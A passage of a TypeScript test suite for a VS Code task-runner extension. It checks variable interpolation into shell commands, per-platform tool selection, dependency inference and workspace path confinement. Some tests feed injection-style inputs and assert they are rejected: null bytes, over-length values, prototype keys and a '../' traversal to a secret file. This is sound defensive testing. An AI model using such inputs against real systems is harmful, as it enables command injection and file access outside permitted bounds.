import * as assert from 'assert';
import * as vscode from 'vscode';
import {
	interpolatePipelineVariables,
	sanitizeInterpolatedValue,
	resolveWithinWorkspace,
	resolveArchiveTaskPath,
	isOnlyPromptCancellation,
	handleFileDialog,
	handleFolderDialog,
	handleQuickPick,
	handleEnvPick,
	PromptCancelledError,
	ActionStoppedError,
	parseTagInput,
	serializeFavorites,
	serializeLinks,
	quotePowerShellArgument,
	quoteWindowsCommandLineArgument,
	quotePosixArgument,
	tokenizeCommandLine,
	formatActionPath,
	mergeCommandAndArgs,
	handleStringManipulation,
	findActionById,
	findActionPathById,
	insertActionIntoDestination,
	buildDestinationPickItems,
	deriveActionIdFromTitle,
	buildActionCommandId,
	validateActionIdInput,
	deriveLinkTitleFromUrl,
	createGroupedTaskPresentationOptions,
	addLinkEntry,
	removeLinkByIdentity,
	addFavoriteEntry,
	confirmDeleteHistoryItem,
	confirmApplyPresetBackup,
	confirmSavePresetOverwrite,
	getCommandString,
	getToolCommand,
	INTERPOLATED_VALUE_MAX_LENGTH,
	buildPowerShellInvocation,
	formatNativeCommandDisplay,
	buildNativeCommandInvocation,
	windowsCommandIsDirectlyLaunchable,
	withPowerShellExitCode,
	savedInputStillValid,
	backfillDialogArrays,
	expandArgTemplate,
	resolvePipelineReference,
	inferTaskDependencies,
	interpolateToolValue,
	interpolateCommandPreservingTokens,
	quoteForCommandTokenizer,
	selectWindowsRawShell,
	resolvePwshPath,
	rawCommandUsesChainOperators,
	resolveWindowsTaskSpawn,
	buildRawOneShotWindowsScript,
	resolveRawShellExecutable,
	buildPosixCommandLine,
	encodePowerShellScript,
	wrapCommandForOneShot,
	createShellExecution,
	filterConflictingItems,
	findConflictingIds,
	mergeActions,
	resolveWorkspaceActions,
	toWorkspaceRelativePath,
	executeShellCommand,
	__testHook_hasManuallyTerminated,
	debounce,
	parsePathInfo,
	handleConfirm,
	serializeExportData,
	parseImportData,
	collectImportTrustAdvisories,
	buildImportTrustReviewDetail,
	confirmImportTrustReview,
	confirmImportInvalidActionsBackup,
	describeImportOperation,
	summarizeImportTrustReview,
	IMPORT_TRUST_REVIEW_LIST_LIMIT,
	mergeImportedActions,
	countActionItems,
	getActionsValidator,
	invalidateActionsCache,
	shouldRecordTaskInput,
	formatExecutedCommandsDocument,
	describeVariableCompletion,
} from '../extension';
import { collectVariableCompletions, type VariableCompletionDetail } from '../variableCompletions';
import { initQuickPickMemory } from '../quickPickMemory';
import { simulateTaskResult } from '../previewRun';
import { normalizeTags, normalizeLineNumber } from '../providers/normalization';
import { LinkViewProvider, mergeInvalidJsonEntries, readLinksFromDisk } from '../providers/linkViewProvider';
import { FavoriteViewProvider, readFavoritesFromDisk } from '../providers/favoriteViewProvider';
import {
	HistoryProvider,
	HistoryEntry,
	createToolHistoryEntry,
	isToolHistoryEntry,
	formatDuration,
	formatHistoryTimestamp,
	formatLastRunBadge,
	buildHistoryItemAriaLabel,
	startHistoryAutoRefresh,
	computeDisambiguatedHistoryLabels,
} from '../providers/historyProvider';
import * as os from 'os';
import * as path from 'path';
import * as fs from 'fs';
import { ActionItem } from '../schema';

suite('Extension Test Suite', () => {
	vscode.window.showInformationMessage('Start all tests.');

	suite('interpolatePipelineVariables', () => {
		/**
		 * 배열 참조가 문자열 자리에서 실제로 해석되는지 (0.6.57).
		 *
		 * 예전에는 리터럴 `${pick.paths}` 가 그대로 남아 셸로 넘어갔다 — 사용자가
		 * "목록이 안 나온다"고 보고한 그 자리다. 단위 검사(`sanitize…`)만으로는
		 * 호출부가 `undefined` 를 어떻게 다루는지 고정되지 않는다.
		 */
		/**
		 * `??` — 먼저 푼 참조가 이긴다.
		 *
		 * 조건(`when`)으로 갈린 분기에서 **하나의 소비자가 어느 쪽 결과든 받게**
		 * 하려고 있다. 꺼진 분기는 결과가 없어 undefined 이므로, 살아남은 쪽이
		 * 자연스럽게 선택된다. 이것이 없으면 소비자를 분기마다 하나씩 복제해야 한다.
		 */
		test('?? 는 먼저 풀리는 참조를 쓴다', () => {
			const onlyFolder = { pickFolder: { path: '/tmp/dir' } };
			assert.strictEqual(
				interpolatePipelineVariables('${pickFile.path ?? pickFolder.path}', onlyFolder),
				'/tmp/dir'
			);
			const onlyFile = { pickFile: { path: '/tmp/a.bin' } };
			assert.strictEqual(
				interpolatePipelineVariables('${pickFile.path ?? pickFolder.path}', onlyFile),
				'/tmp/a.bin'
			);
		});

		test('?? 는 앞쪽을 우선하고 셋 이상도 이어진다', () => {
			const ctx = { a: { x: 'A' }, b: { y: 'B' }, c: { z: 'C' } };
			assert.strictEqual(interpolatePipelineVariables('${a.x ?? b.y}', ctx), 'A');
			assert.strictEqual(interpolatePipelineVariables('${miss.x ?? miss2.y ?? c.z}', ctx), 'C');
		});

		test('?? 의 대안이 전부 없으면 리터럴로 남는다', () => {
			// 조용히 빈 문자열이 되면 경로 자리에 빈 값이 들어가 엉뚱한 곳을 가리킨다.
			// 미해결 리터럴은 눈에 띄고, 소비자를 건너뛰게 하는 신호로도 쓸 수 있다.
			assert.strictEqual(interpolatePipelineVariables('${a.x ?? b.y}', {}), '${a.x ?? b.y}');
		});

		test('?? 는 빈 대안을 무시한다', () => {
			const ctx = { b: { y: 'B' } };
			assert.strictEqual(interpolatePipelineVariables('${ ?? b.y}', ctx), 'B');
			assert.strictEqual(interpolatePipelineVariables('${b.y ?? }', ctx), 'B');
		});

		test('배열 참조를 공백으로 이어 붙여 넣는다', () => {
			const ctx = { pick: { paths: ['/a/x.bin', '/a/y.bin'], names: ['x.bin', 'y.bin'], count: 2 } };
			assert.strictEqual(interpolatePipelineVariables('echo ${pick.paths}', ctx), 'echo /a/x.bin /a/y.bin');
			assert.strictEqual(interpolatePipelineVariables('${pick.names} (${pick.count})', ctx), 'x.bin y.bin (2)');
		});

		test('빈 배열은 빈 문자열이 된다 (리터럴이 남지 않는다)', () => {
			assert.strictEqual(interpolatePipelineVariables('[${pick.paths}]', { pick: { paths: [] } }), '[]');
		});

		test('should replace simple variable', () => {
			const template = 'Hello ${name}';
			const context = { name: 'World' };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Hello World');
		});

		test('should replace task output variable', () => {
			const template = 'File: ${task1.output}';
			const context = { task1: { output: 'result.txt' } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'File: result.txt');
		});

		test('should replace nested property', () => {
			const template = 'Path: ${task1.path}';
			const context = { task1: { path: '/path/to/file' } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Path: /path/to/file');
		});

		test('should replace multiple variables', () => {
			const template = '${task1.name} and ${task2.name}';
			const context = { task1: { name: 'Alice' }, task2: { name: 'Bob' } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Alice and Bob');
		});

		test('should leave unmatched variables unchanged', () => {
			const template = 'Hello ${unknown}';
			const context = {};
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Hello ${unknown}');
		});

		test('should handle non-string template', () => {
			const template = 123 as any;
			const context = {};
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 123);
		});

		test('should handle empty template', () => {
			const template = '';
			const context = {};
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, '');
		});

		test('should replace outputDir variable', () => {
			const template = 'Output: ${task1.outputDir}';
			const context = { task1: { outputDir: '/output/dir' } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Output: /output/dir');
		});

		test('should prefer nested property over output', () => {
			const template = 'Path: ${task1.path}';
			const context = { task1: { path: '/custom/path', output: '/default/path' } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Path: /custom/path');
		});

		/**
		 * 속성이 붙은 참조는 그 속성이 없을 때 **폴백하지 않는다.**
		 *
		 * 예전에는 `${task1.result}` 가 `task1.output` 으로 떨어졌다. capture
		 * 규칙이 매칭되지 않아 파생 변수가 만들어지지 않은 경우, 사용자가
		 * 정규식으로 좁혔다고 믿는 자리에 **stdout 전체**가 들어가는 경로였다.
		 * 이제 리터럴로 남아 Preview Run · Doctor 가 미해결로 보고한다.
		 */
		test('속성이 없으면 output 으로 폴백하지 않고 리터럴로 남는다', () => {
			const template = 'Output: ${task1.result}';
			const context = { task1: { output: 'FULL UNVALIDATED STDOUT' } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Output: ${task1.result}');
		});

		test('속성이 없으면 outputDir 로도 폴백하지 않는다', () => {
			const template = 'Dir: ${task1.result}';
			const context = { task1: { outputDir: '/dir' } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Dir: ${task1.result}');
		});

		test('bare 참조는 여전히 output / outputDir 로 해석된다', () => {
			assert.strictEqual(
				interpolatePipelineVariables('Output: ${task1}', { task1: { output: 'result.txt' } }),
				'Output: result.txt'
			);
			assert.strictEqual(
				interpolatePipelineVariables('Dir: ${task1}', { task1: { outputDir: '/dir' } }),
				'Dir: /dir'
			);
			// output 이 있으면 outputDir 보다 우선한다 (기존 우선순위 유지).
			assert.strictEqual(
				interpolatePipelineVariables('${task1}', { task1: { output: 'o', outputDir: '/d' } }),
				'o'
			);
		});

		test('실재하는 속성은 그대로 우선한다 (폴백 축소가 정상 경로를 건드리지 않는다)', () => {
			const context = { pick: { path: '/a/x.bin', output: 'unrelated' } };
			assert.strictEqual(interpolatePipelineVariables('${pick.path}', context), '/a/x.bin');
		});

		/**
		 * `tool` 보간은 **문자열 단위**여야 한다.
		 *
		 * `JSON.stringify → interpolate → JSON.parse` 로 하면 보간된 값이 JSON
		 * 문자열 안으로 들어가면서 역슬래시가 escape 로 재해석된다 —
		 * `C:\\Users\\me` 는 파싱이 깨지고 `C:\\temp` 는 `\t` 가 탭이 되어
		 * **조용히** 다른 경로가 된다. Windows 경로가 흔한 자리다.
		 */
		suite('interpolateToolValue', () => {
			const winCtx = { workspaceFolder: 'C:\\Users\\me' };

			function withPlatform<T>(platform: string, fn: () => T): T {
				const original = process.platform;
				Object.defineProperty(process, 'platform', { value: platform });
				try {
					return fn();
				} finally {
					Object.defineProperty(process, 'platform', { value: original });
				}
			}

			test('Windows 경로를 그대로 보존한다 (문자열 tool)', () => {
				assert.strictEqual(
					interpolateToolValue('${workspaceFolder}\\bin\\7z.exe', winCtx),
					'C:\\Users\\me\\bin\\7z.exe'
				);
			});

			test('탭으로 바뀔 수 있는 경로도 그대로다', () => {
				assert.strictEqual(
					interpolateToolValue('${workspaceFolder}/x', { workspaceFolder: 'C:\\temp' }),
					'C:\\temp/x'
				);
			});

			test('보간할 것이 없으면 그대로 돌려준다', () => {
				assert.strictEqual(interpolateToolValue('/usr/bin/7z', winCtx), '/usr/bin/7z');
			});

			/**
			 * **고르는 것이 먼저다.**
			 *
			 * 보간은 `sanitizeInterpolatedValue` 를 거치며 NUL 바이트·길이 초과에서
			 * throw 한다. 모든 branch 를 먼저 보간하면, 이 기계에서 절대 실행되지
			 * 않을 branch 의 값 하나가 태스크 전체를 실패시킨다.
			 */
			suite('현재 플랫폼 branch 를 먼저 고른다', () => {
				const tool = {
					windows: '${workspaceFolder}\\bin\\7z.exe',
					macos: '${workspaceFolder}/bin/7z',
				};

				test('활성 branch 의 참조를 보간해 돌려준다', () => {
					assert.strictEqual(
						interpolateToolValue(tool, { workspaceFolder: '/ws' }, 'darwin'),
						'/ws/bin/7z'
					);
				});

				test('Windows branch 의 역슬래시는 그대로다', () => {
					assert.strictEqual(
						interpolateToolValue(tool, { workspaceFolder: 'C:\\temp' }, 'win32'),
						'C:\\temp\\bin\\7z.exe'
					);
				});

				test('비활성 branch 의 미해결 참조는 실행을 막지 않는다', () => {
					assert.strictEqual(
						interpolateToolValue({ windows: '${ghost.output}', macos: '/usr/bin/7z' }, {}, 'darwin'),
						'/usr/bin/7z'
					);
				});

				test('비활성 branch 의 NUL 바이트가 실행을 막지 않는다', () => {
					// 보간이 먼저면 sanitize 가 여기서 throw 해, macOS 사용자가
					// 손도 대지 않은 windows 설정 때문에 태스크를 못 돌린다.
					const ctx = { pick: { value: 'bad\u0000value' } };
					assert.strictEqual(
						interpolateToolValue({ windows: '${pick.value}', macos: '/usr/bin/7z' }, ctx, 'darwin'),
						'/usr/bin/7z'
					);
				});

				test('비활성 branch 의 길이 초과 값도 실행을 막지 않는다', () => {
					const ctx = { pick: { value: 'x'.repeat(INTERPOLATED_VALUE_MAX_LENGTH + 1) } };
					assert.strictEqual(
						interpolateToolValue({ windows: '${pick.value}', macos: '/usr/bin/7z' }, ctx, 'darwin'),
						'/usr/bin/7z'
					);
				});

				test('활성 branch 의 NUL 바이트는 그대로 실패한다', () => {
					const ctx = { pick: { value: 'bad\u0000value' } };
					assert.throws(
						() => interpolateToolValue({ macos: '${pick.value}' }, ctx, 'darwin'),
						/null byte/
					);
				});

				test('활성 branch 의 길이 초과도 그대로 실패한다', () => {
					const ctx = { pick: { value: 'x'.repeat(INTERPOLATED_VALUE_MAX_LENGTH + 1) } };
					assert.throws(
						() => interpolateToolValue({ macos: '${pick.value}' }, ctx, 'darwin'),
						/exceeds maximum length/
					);
				});

				test('현재 플랫폼 branch 가 없으면 실행 전에 실패한다', () => {
					// 문구는 getToolCommand 와 같아야 한다 — 실패 지점만 앞당겨질 뿐
					// 사용자가 보는 메시지는 그대로여야 한다.
					assert.throws(
						() => interpolateToolValue({ windows: 'C:\\7z.exe' }, {}, 'darwin'),
						/No tool path specified for the current platform/
					);
					assert.throws(
						() => withPlatform('darwin', () => getToolCommand({ windows: 'C:\\7z.exe' })),
						/No tool path specified for the current platform/
					);
				});

				test('tool 이 없거나 빈 값이면 실행 전에 실패한다', () => {
					// 호출부는 task.tool 이 undefined/null 이 아닐 때만 부른다.
					// 빈 문자열은 getToolCommand 도 던지는 값이라 여기서 드러내야 한다.
					assert.throws(() => interpolateToolValue('', {}, 'darwin'), /No tool path specified/);
					assert.throws(() => interpolateToolValue({ macos: '' }, {}, 'darwin'), /No tool path specified/);
					assert.throws(() => interpolateToolValue(undefined, {}, 'darwin'), /No tool path specified/);
				});

				test('기본 platform 은 현재 프로세스의 것이다', () => {
					const result = withPlatform('darwin', () => interpolateToolValue(
						{ windows: 'C:\\7z.exe', macos: '/usr/local/bin/7z' },
						{}
					));
					assert.strictEqual(result, '/usr/local/bin/7z');
				});
			});

			/**
			 * 런타임의 실제 연결: `executeSingleTask` 의 zip/unzip 분기가
			 * `interpolateToolValue` 로 **고르고 보간한** 문자열을 넘기면,
			 * `handleZip`/`handleUnzip` 의 `getToolCommand` 가 그것을 그대로 쓴다.
			 */
			suite('보간 → 실행 커맨드 (zip/unzip 실행 경로)', () => {
				test('고른 branch 가 실행 커맨드가 된다', () => {
					const interpolated = interpolateToolValue(
						{ windows: '${workspaceFolder}\\7z.exe', macos: '${workspaceFolder}/bin/7z' },
						{ workspaceFolder: '/ws' },
						'darwin'
					);
					assert.strictEqual(getToolCommand(interpolated), '/ws/bin/7z');
				});

				test('공백이 든 경로는 실행 단계에서 인용된다', () => {
					const interpolated = interpolateToolValue(
						{ macos: '${workspaceFolder}/my tools/7z' },
						{ workspaceFolder: '/ws' },
						'darwin'
					);
					assert.strictEqual(getToolCommand(interpolated), '"/ws/my tools/7z"');
				});
			});

			test('zip/unzip 분기가 tool 을 보간해서 넘긴다', () => {
				// 위 조합 테스트가 의미를 가지려면 실행 경로가 실제로 보간된
				// task 를 넘겨야 한다. `zip` 만 원본을 쓰던 회귀가 있었다.
				const source = fs.readFileSync(path.join(__dirname, '..', '..', 'src', 'extension.ts'), 'utf-8');
				for (const kind of ['Zip', 'Unzip']) {
					const re = new RegExp(
						`interpolated${kind}Task\\.tool = interpolateToolValue\\(task\\.tool, interpolationContext\\)[\\s\\S]*?handle${kind}\\(\\s*interpolated${kind}Task`
					);
					assert.ok(
						re.test(source),
						`${kind} 분기가 보간된 tool 을 handle${kind} 로 넘기지 않는다 — Preview 와 실행이 갈린다`
					);
				}
			});
		});

		test('상속된 prototype 키는 태스크 결과로 해석되지 않는다', () => {
			// 평범한 객체 컨텍스트에서는 `${constructor.name}` 이 "Object" 로,
			// `${toString.name}` 이 "toString" 으로 "해석"되어 셸 명령에 들어갔다.
			const ctx: any = { build: { output: 'x' } };
			assert.strictEqual(interpolatePipelineVariables('${constructor.name}', ctx), '${constructor.name}');
			assert.strictEqual(interpolatePipelineVariables('${toString.name}', ctx), '${toString.name}');
			assert.strictEqual(resolvePipelineReference('constructor', ctx), undefined);
			// 정상 참조는 그대로 동작한다.
			assert.strictEqual(interpolatePipelineVariables('${build.output}', ctx), 'x');
		});

		test('OS branch 는 고른 뒤에 보간한다', () => {
			// 모든 branch 를 보간한 뒤 고르면, 이 기계에서 실행되지 않을 branch 의
			// 값 하나 때문에 태스크 전체가 실패한다 — 보간은 NUL·길이 상한에서
			// throw 하기 때문이다. `interpolateToolValue` 가 같은 이유로 이미
			// 이 순서이고, command / itemsFromCommand 도 같아야 한다.
			const huge = 'x'.repeat(40000);
			const ctx = { pick: { value: huge } };
			const other = process.platform === 'win32' ? 'macos' : 'windows';
			const branches: Record<string, string> = { [other]: 'echo ${pick.value}' };
			branches[process.platform === 'win32' ? 'windows' : process.platform === 'darwin' ? 'macos' : 'linux'] = 'echo ok';

			// 고른 뒤 보간하면 이 기계의 branch 만 검사 대상이 된다.
			assert.strictEqual(
				interpolatePipelineVariables(getCommandString(branches), ctx),
				'echo ok'
			);
			// 반대 순서(모든 branch 보간)는 실패한다 — 이 검사가 지키려는 것.
			assert.throws(() => interpolatePipelineVariables(branches[other], ctx));
		});

		test('env 는 임의 키를 허용한다 — 이름이 겹쳐도 빼면 안 된다', () => {
			// 제외를 **키 이름**으로 모든 깊이에 적용하면, `env: { title: … }` 처럼
			// `output.title` 과 이름이 겹치는 순간 실제로 보간되는 값이 빠진다.
			// 그 값이 비밀이면 taint 판정까지 놓쳐 평문이 로그에 남는다.
			const ids = new Set(['A', 'B']);
			for (const key of ['title', 'mode', 'id', 'type', 'options', 'function', 'encoding', 'dependsOn']) {
				const deps = inferTaskDependencies(
					{ id: 'B', type: 'shell', command: 'x', env: { [key]: '${A.value}' } } as any,
					ids
				);
				assert.deepStrictEqual([...deps], ['A'], `env.${key} 의 참조가 빠졌다 — 비밀이면 마스킹도 놓친다`);
			}
		});

		test('when 은 var 만 보간한다 — 비교 대상은 리터럴이다', () => {
			const ids = new Set(['A', 'B']);
			assert.deepStrictEqual(
				[...inferTaskDependencies(
					{ id: 'B', type: 'shell', command: 'x', when: { var: '${A.value}', equals: 'y' } } as any, ids)],
				['A'], 'when.var 의 의존성이 사라졌다'
			);
			for (const key of ['equals', 'notEquals', 'matches', 'in']) {
				assert.deepStrictEqual(
					[...inferTaskDependencies(
						{ id: 'B', type: 'shell', command: 'x', when: { var: 'lit', [key]: '${A.value}' } } as any, ids)],
					[], `when.${key} 에서 가짜 의존성이 생겼다`
				);
			}
		});

		test('보간하지 않는 필드는 의존성을 만들지 않는다', () => {
			// 런타임이 `confirmLabel` 을 보간하지 않는데도 의존성이 생기면,
			// 순서가 밀리는 정도로 끝나지 않는다 — A 가 조건으로 꺼질 때 B 까지
			// 조용히 꺼지고, 반대 방향의 진짜 참조가 있으면 가짜 순환으로
			// **액션 전체가 거부**된다.
			const ids = new Set(['A', 'B']);
			for (const field of ['confirmLabel', 'cancelLabel', 'validateMessage', 'itemsExclude']) {
				const deps = inferTaskDependencies(
					{ id: 'B', type: 'confirm', message: 'go?', [field]: '${A.value}' } as any,
					ids
				);
				assert.deepStrictEqual([...deps], [], `${field} 에서 가짜 의존성이 생겼다`);
			}
			// 다이얼로그 options 도 보간 대상이 아니다.
			assert.deepStrictEqual(
				[...inferTaskDependencies(
					{ id: 'B', type: 'fileDialog', options: { title: '${A.value}', openLabel: '${A.value}' } } as any,
					ids
				)],
				[]
			);
			// output.title 도 마찬가지 (content/filePath 는 보간된다 — 아래 참조).
			assert.deepStrictEqual(
				[...inferTaskDependencies(
					{ id: 'B', type: 'shell', command: 'x', output: { mode: 'editor', title: '${A.value}' } } as any,
					ids
				)],
				[]
			);
		});

		test('보간하는 필드는 계속 의존성을 만든다 (과잉 제외 방지)', () => {
			// 위 제외 목록이 넓어지면 이번엔 **진짜 의존성이 사라진다** — 그쪽이
			// 더 나쁘다(순서가 어긋나 값이 오기 전에 실행된다). 대표 필드를 고정한다.
			const ids = new Set(['A', 'B']);
			const cases: Array<[string, any]> = [
				['command', { id: 'B', type: 'shell', command: 'echo ${A.value}' }],
				['args', { id: 'B', type: 'command', command: 'echo', args: ['${A.value}'] }],
				['cwd', { id: 'B', type: 'shell', command: 'x', cwd: '${A.value}' }],
				['env', { id: 'B', type: 'shell', command: 'x', env: { K: '${A.value}' } }],
				['prompt', { id: 'B', type: 'inputBox', prompt: '${A.value}' }],
				['message', { id: 'B', type: 'confirm', message: '${A.value}' }],
				['input', { id: 'B', type: 'stringManipulation', function: 'trim', input: '${A.value}' }],
				['path', { id: 'B', type: 'writeFile', path: '${A.value}', content: 'x' }],
				['content', { id: 'B', type: 'writeFile', path: 'p', content: '${A.value}' }],
				['archive', { id: 'B', type: 'unzip', archive: '${A.value}' }],
				['items[].label', { id: 'B', type: 'quickPick', items: [{ label: '${A.value}' }] }],
				['itemsFromCommand', { id: 'B', type: 'quickPick', itemsFromCommand: 'echo ${A.value}' }],
				// `output` 은 `passTheResultToNextTask` 가 있어야 런타임이 읽는다 —
				// 없으면 죽은 필드이고 Doctor 도 `output.ignored` 로 그렇게 알린다.
				['output.content', { id: 'B', type: 'shell', command: 'x', passTheResultToNextTask: true, output: { mode: 'file', filePath: 'f', content: '${A.value}' } }],
				['output.filePath', { id: 'B', type: 'shell', command: 'x', passTheResultToNextTask: true, output: { mode: 'file', filePath: '${A.value}' } }],
				['when.var', { id: 'B', type: 'shell', command: 'x', when: { var: '${A.value}', equals: 'y' } }],
			];
			for (const [label, task] of cases) {
				assert.deepStrictEqual(
					[...inferTaskDependencies(task, ids)], ['A'],
					`${label} 의 의존성이 사라졌다 — 값이 오기 전에 실행된다`
				);
			}
		});

		test('의존성 추론도 head 를 다듬지 않는다', () => {
			// 다듬으면 `${ producer.output}` 이 producer 에 대한 의존성으로 잡혀
			// 실행 순서는 맞춰지지만, 런타임은 `" producer"` 를 못 찾아 값이
			// 리터럴로 남는다 — 순서만 잡고 값은 안 오는 상태가 된다.
			const spaced = inferTaskDependencies(
				{ id: 'c', type: 'shell', command: 'use ${ producer.output}' } as any,
				new Set(['producer', 'c'])
			);
			assert.deepStrictEqual([...spaced], [], 'trim 된 head 로 의존성을 만들면 안 된다');

			// 반대로 id 자체에 공백이 있으면(스키마상 유효) 매칭되어야 한다.
			const exact = inferTaskDependencies(
				{ id: 'c', type: 'shell', command: 'use ${ producer.output}' } as any,
				new Set([' producer', 'c'])
			);
			assert.deepStrictEqual([...exact], [' producer']);
		});

		test('점 뒤가 빈 참조는 bare 가 아니다', () => {
			// `!property` 로 bare 를 판정하면 `${producer.}` 가 폴백을 타서
			// "속성을 쓴 참조는 폴백하지 않는다" 는 계약이 오타 하나로 뚫린다.
			const context = { producer: { output: 'FULL UNVALIDATED STDOUT' } };
			assert.strictEqual(
				interpolatePipelineVariables('run ${producer.}', context),
				'run ${producer.}'
			);
			assert.strictEqual(resolvePipelineReference('producer.', context), undefined);
			// 이름에 점이 여러 개인 형태도 마찬가지.
			assert.strictEqual(resolvePipelineReference('producer..', context), undefined);
		});

		test('should handle deeply nested properties', () => {
			const template = 'Value: ${task1.data}';
			const context = { task1: { data: { info: { value: 'deep' } } } };
			const result = interpolatePipelineVariables(template, context);
			// Note: interpolatePipelineVariables only handles one level of nesting
			// For deeply nested properties, the object is converted to string
			assert.ok(result.includes('Value:'));
		});

		test('should handle variables with special characters', () => {
			const template = 'Value: ${task_1.name}';
			const context = { task_1: { name: 'special' } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Value: special');
		});

		test('should handle empty variable name', () => {
			const template = 'Value: ${}';
			const context = {};
			const result = interpolatePipelineVariables(template, context);
			// Empty variable name should be left unchanged
			assert.strictEqual(result, 'Value: ${}');
		});

		test('should handle variables with numbers', () => {
			const template = 'Task ${task1.id}: ${task1.name}';
			const context = { task1: { id: 123, name: 'test' } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Task 123: test');
		});

		test('should handle boolean values', () => {
			const template = 'Status: ${task1.success}';
			const context = { task1: { success: true } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Status: true');
		});

		test('should leave the placeholder when the resolved value is null', () => {
			// sanitizeInterpolatedValue now refuses null to avoid injecting "null"
			// strings into shell commands; the placeholder remains untouched instead.
			const template = 'Value: ${task1.data}';
			const context = { task1: { data: null } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Value: ${task1.data}');
		});

		test('should handle undefined values in context', () => {
			const template = 'Value: ${task1.missing}';
			const context = { task1: {} };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Value: ${task1.missing}');
		});

		test('should handle multiple variables in same string', () => {
			const template = '${a} and ${b} and ${c}';
			const context = { a: 'first', b: 'second', c: 'third' };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'first and second and third');
		});

		test('should handle adjacent variables', () => {
			const template = '${a}${b}';
			const context = { a: 'hello', b: 'world' };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'helloworld');
		});

		test('should handle variable at start of string', () => {
			const template = '${name} is here';
			const context = { name: 'John' };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'John is here');
		});

		test('should handle variable at end of string', () => {
			const template = 'Hello ${name}';
			const context = { name: 'World' };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, 'Hello World');
		});

		test('should reject interpolated values containing a null byte', () => {
			const template = 'echo ${payload}';
			const context = { payload: 'safe\x00danger' };
			assert.throws(() => interpolatePipelineVariables(template, context), /null byte/);
		});

		test('should reject interpolated values exceeding the maximum length', () => {
			const huge = 'a'.repeat(40 * 1024);
			const template = 'echo ${payload}';
			const context = { payload: huge };
			assert.throws(() => interpolatePipelineVariables(template, context), /maximum length/);
		});

		test('should coerce numbers and booleans but skip objects', () => {
			const template = '${count} ${flag} ${obj}';
			const context = { count: 42, flag: true, obj: { a: 1 } };
			const result = interpolatePipelineVariables(template, context);
			assert.strictEqual(result, '42 true ${obj}');
		});
	});

	suite('sanitizeInterpolatedValue', () => {
		test('accepts plain strings', () => {
			assert.strictEqual(sanitizeInterpolatedValue('hello'), 'hello');
		});
		test('returns undefined for null/undefined/objects', () => {
			assert.strictEqual(sanitizeInterpolatedValue(undefined), undefined);
			assert.strictEqual(sanitizeInterpolatedValue(null), undefined);
			assert.strictEqual(sanitizeInterpolatedValue({ a: 1 }), undefined);
		});
		/**
		 * 배열은 공백으로 이어 붙인다 (0.6.57).
		 *
		 * 예전에는 `undefined` 를 돌려줬고, 그러면 호출부가 참조를 리터럴로
		 * 남긴다 — `echo ${pick.paths}` 가 문자 그대로 실행됐다는 뜻이다.
		 * 문서는 `${pick.paths}` 를 fileDialog 의 결과 참조로 안내하면서 그것이
		 * `args` 안에서만 동작한다는 말을 하지 않았다.
		 */
		test('joins arrays with a space', () => {
			assert.strictEqual(sanitizeInterpolatedValue(['a', 'b']), 'a b');
			assert.strictEqual(sanitizeInterpolatedValue([1, 2]), '1 2');
			assert.strictEqual(sanitizeInterpolatedValue([]), '');
			// 항목마다 같은 규칙을 적용한다 — 넣을 수 없는 값은 빠진다.
			assert.strictEqual(sanitizeInterpolatedValue(['a', null, { x: 1 }, 'b']), 'a b');
		});
		test('applies the null-byte guard to array items too', () => {
			assert.throws(() => sanitizeInterpolatedValue(['ok', 'x\x00y']), /null byte/);
		});
		test('applies the length guard to the joined result', () => {
			// 항목 하나하나는 한도 안이어도 이어 붙이면 넘길 수 있다. 합친 뒤에
			// 재지 않으면 이 경로로만 한도가 빠져나간다.
			const chunk = 'a'.repeat(1000);
			const many = Array.from({ length: 200 }, () => chunk);
			assert.throws(() => sanitizeInterpolatedValue(many), /maximum length/);
		});
		test('중첩 배열도 평평하게 이어 붙인다', () => {
			assert.strictEqual(sanitizeInterpolatedValue([['a', 'b'], 'c']), 'a b c');
		});
		test('rejects strings with null byte', () => {
			assert.throws(() => sanitizeInterpolatedValue('x\x00y'), /null byte/);
		});
	});

	suite('resolveWithinWorkspace', () => {
		const root = path.resolve(os.tmpdir(), 'taskhub-test-root');
		test('accepts paths inside workspace', () => {
			const inside = path.join(root, 'nested', 'file.txt');
			const resolved = resolveWithinWorkspace(inside, [root]);
			assert.strictEqual(resolved, inside);
		});
		test('accepts the root itself', () => {
			const resolved = resolveWithinWorkspace(root, [root]);
			assert.strictEqual(resolved, root);
		});
		test('rejects parent-directory traversal', () => {
			const escape = path.join(root, '..', 'other', 'secret.txt');
			assert.throws(() => resolveWithinWorkspace(escape, [root]), /outside/);
		});
		test('rejects paths with null bytes', () => {
			assert.throws(() => resolveWithinWorkspace('/tmp/foo\x00bar', [root]), /null byte/);
		});
		test('rejects when no workspace is provided', () => {
			assert.throws(() => resolveWithinWorkspace('/tmp/foo', []), /No workspace/);
		});
		test('accepts path under any of multiple roots', () => {
			const other = path.resolve(os.tmpdir(), 'taskhub-test-other');
			const inside = path.join(other, 'a.txt');
			const resolved = resolveWithinWorkspace(inside, [root, other]);
			assert.strictEqual(resolved, inside);
		});
		test('resolves relative paths against the baseDir (action workspace)', () => {
			// Regression: previously used process.cwd() as the base, which made
			// "report.txt" land in an unpredictable directory.
			const resolved = resolveWithinWorkspace('report.txt', [root], root);
			assert.strictEqual(resolved, path.join(root, 'report.txt'));
		});
		test('resolves relative subpaths against the baseDir', () => {
